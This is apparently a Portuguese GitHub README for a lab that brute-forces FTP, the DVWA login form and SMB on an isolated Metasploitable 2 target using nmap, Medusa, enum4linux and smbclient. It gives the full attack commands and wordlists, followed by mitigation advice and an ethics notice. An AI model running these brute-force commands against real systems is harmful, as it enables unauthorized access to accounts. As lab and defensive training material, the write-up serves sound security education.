# 🔍 Auditoria de Segurança com Medusa - Laboratório de Força Bruta (Kali + Metasploitable 2 + DVWA)
O objetivo deste projeto foi compreender as técnicas ofensivas e refletir sobre mitigação e boas práticas de segurança nos sistemas. Para isso, foi realizado, antes de tudo, a configuração de um ambiente controlado usando Kali Linux e Metasploitable 2, com foco na execução de ataques de força bruta utilizando a ferramenta Medusa.

<br>

# 1 - 🛠️ Ambiente Utilizado:
* VM Usada: VirtualBox;
* SOs usadas: Kali Linux(Atacante) e Metasploitable 2(Alvo);
* Explorações: FTP, DVWA, SMB;
* Ferramentas Para a Exploração: Nmap, Medusa, SMBClient;
* Configurando a placa de rede dentro da VM como: "Host-Only", tanto do Kali Linux quanto do Metaspoitable 2. <br>
        └── Isso garante que o ataque não saia para a internet real.

<br>

## 2 - 📝 Verificações Iniciais:
- Verificação de ping entre os dois SOs; <br>
      └── Verifica se ambos estão se comunicando.

- Digite o comando no metasploitable 2 para saber o ip e realizar a verificação do mesmo (Faça isso após entrar com o login e senha do metasploitable 2):
  ``` bash
  ip a
  ```
- Após isso, anote o Inet e teste no Kali Linux.
  ``` bash
  ping -c 3 coloque o IP
   ```
  
- Criação de listas(Wordlists) no Kali Linux para a realização dos testes de força bruta; <br>
      └── Se ocorrer erro ao gerar a wordlist, reinicie o Kali e tente novamente.

<br>

## 3 - 🚪 Cenário de Ataque no Protocolo FTP:
 * **3.1:** Escanear possiveis portas abertas e o tipo de serviço:
   ```bash
   nmap -sV -p 21,22,80,445,139 coloque o IP
   ```
  <img width="1029" height="553" alt="image" src="https://github.com/user-attachments/assets/a6544b03-ac68-4690-962d-9654814ada3a" />
  
  * **Resultado da análise:** Acesso bem `sucedido` ✔

<br>

* **3.2:** Quebrando senhas com a ferramenta Medusa: Faça a criação de arquivos com possíveis nomes de usuários e senhas:
 ```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
```

```bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```
 <img width="1179" height="555" alt="image" src="https://github.com/user-attachments/assets/5a336aa4-5ce3-4112-b86f-c1d37de474d4" />
 
 * **Resultado da exploração:** Usuário e Login encontrados com sucesso ✔

## 4 - 📑 Cenários de Ataques em Formulários de Login:
* **4.1:** Entrar no site: DVWA
```bash
192.168.56.102/dvwa/login.php
```
**4.2 - Criar wordlists para usuários e senhas;**

**4.3 - Rodar o seguinte comando:**
```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE: '/dvwa/login.php' \
-m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```
<img width="1251" height="607" alt="image" src="https://github.com/user-attachments/assets/2068f786-ab68-4490-82f5-79932d1fc090" />

- **Resumo:** O comando faz brute force no login do DVWA via HTTP, usando listas de usuários e senhas, enviando requisições do tipo POST, identificando falhas pelo texto “Login failed” e executando tudo em 6 tentativas acontecendo ao mesmo tempo.

## 5 - 💻 Cenário de Ataque SMB:
* **5.1:** Enumerar informações de sistemas Windows ou serviços SMB/Samba.
```bash
enum4linux -a 192.168.56.102 | tee enum4_output.txt
```
* **Resultado da análise:** Acesso a listas de usuários, compartilhamentos disponiveis e até nome de dominio ✔

* **5.2:** Ataque ao SMB com a medusa
```bash
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 
```
* **5.3:** Acesso ao servidor SMB:
```bash
smbclient -L //192.168.56.102 -U msfadmin
```
<img width="1153" height="548" alt="image" src="https://github.com/user-attachments/assets/88750cfd-fca7-4dae-87d2-2acc93335eaf" />

* **Resultado Final:** Acesso bem `sucedido` ✔
  
![](https://i.imgur.com/WTLoFrq.png)

## 🛡️ Para Concluir: Listarei Algumas Recomendações de Mitigação e Defesa
**1. <u>Fortalecimento da Autenticação: </u>** <br>
- Política de Senhas Fortes: Implementar regras que exijam senhas com alta entropia (mínimo de 12-14 caracteres, uso de maiúsculas, minúsculas, números e símbolos) para dificultar ataques baseados em dicionários comuns.

- Autenticação Multifator (MFA): Tornar obrigatório o uso de MFA (2FA) para todos os acessos externos e administrativos (SSH, VPN, Painéis Web). O MFA neutraliza a eficácia da descoberta de senha simples.

- Bloqueio de Contas (Account Lockout): Configurar o bloqueio temporário da conta de usuário após um número definido de tentativas falhas (ex: 5 tentativas em 10 minutos). Nota: Monitorar para evitar ataques de negação de serviço (DoS) contra contas.

- Hashing Robusto: Garantir que as senhas sejam armazenadas utilizando algoritmos de hashing modernos e lentos (como Argon2 ou Bcrypt) com salting, protegendo contra ataques offline caso o banco de dados seja vazado.

**2. <u>Controles Técnicos de Rede e Servidor (Hardening):</u>**
- Ferramentas de Prevenção: Monitora os logs em tempo real e bane temporariamente (via Firewall/iptables) o endereço IP de origem que exceder o limite de falhas de autenticação.

- Desativação de Serviços e Contas Padrão: <br>
Desabilitar serviços não utilizados ou inseguros (como Telnet e FTP sem criptografia).
Renomear ou desativar contas padrão de fábrica (ex: admin, root, msfadmin, guest). <br>

- Alterar as portas padrões de serviços (ex: mover SSH da 22 para 2222) para reduzir o ruído de scanners automatizados e bots simples.

**3. <u>Proteção para Aplicações Web (Cenário DVWA):</u>**
- Web Application Firewall (WAF): Implementar um WAF para detectar e bloquear padrões de tráfego malicioso, incluindo tentativas massivas de login e injeções de código.

- Rate Limiting: Configurar o servidor web (Nginx/Apache) para limitar a taxa de requisições por segundo vindas de um único IP, mitigando ataques de força bruta rápidos.

- CAPTCHA: Implementar desafios (como reCAPTCHA) na tela de login após a primeira tentativa falha, impedindo a automação via ferramentas como Hydra ou Medusa.

**4. <u>Monitoramento e Governança:</u>**
- Monitoramento de Logs (SIEM): Centralizar os logs de autenticação em uma solução SIEM (Splunk, ELK Stack) para criar alertas automáticos sobre anomalias, como "Múltiplas falhas de login seguidas de um sucesso" ou "Acesso fora do horário comercial".

- Princípio do Menor Privilégio: Garantir que usuários e serviços tenham apenas as permissões estritamente necessárias para suas funções.

- Auditoria Periódica: Realizar testes de intrusão (Pentests) e varreduras de vulnerabilidade trimestrais para validar se as políticas de senha e bloqueio estão ativas e funcionais.

## Aviso de Uso Ético
Este projeto é exclusivamente educacional e foi desenvolvido para testes em **ambientes isolados**.  
A execução de ataques de força bruta em sistemas reais, sem permissão explícita, é ilegal.

Leia a política completa em:  
[**SECURITY.md**](./SECURITY.md)

<h2> 🔗 Compartilhe com a comunidade 🧡 </h2>

Por favor, se esse conteúdo te ajudou, não esqueça de compartilhar 😁

[![GitHub Repo stars](https://img.shields.io/badge/share%20on-twitter-03A9F4?logo=twitter)](https://twitter.com/share?url=https://github.com/Luhrodrigues45/Auditoria-de-forca-bruta) [![GitHub Repo stars](https://img.shields.io/badge/share%20on-facebook-1976D2?logo=facebook)](https://www.facebook.com/sharer/sharer.php?u=https://github.com/Luhrodrigues45/Auditoria-de-forca-bruta) [![GitHub Repo stars](https://img.shields.io/badge/share%20on-linkedin-3949AB?logo=linkedin)](https://www.linkedin.com/shareArticle?url=https://github.com/Luhrodrigues45/Auditoria-de-forca-bruta)
